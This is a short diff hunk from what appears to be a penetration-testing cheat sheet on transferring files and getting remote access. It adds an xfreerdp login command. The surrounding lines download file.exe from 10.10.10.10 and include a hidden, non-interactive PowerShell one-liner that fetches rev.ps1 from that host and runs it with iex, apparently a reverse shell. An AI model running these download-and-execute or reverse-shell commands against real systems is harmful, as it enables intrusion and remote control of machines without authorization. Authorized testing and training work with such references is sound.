@@ -53,6 +53,7 @@ Invoke-RestMethod "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.e
 powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')  
 
 rdesktop (ip) -r disk:share=/home/store  
+xfreerdp /u:alex /v:10.10.10.10 +clipboard  
 
 Interactive shell:
 --------------------------------------------------
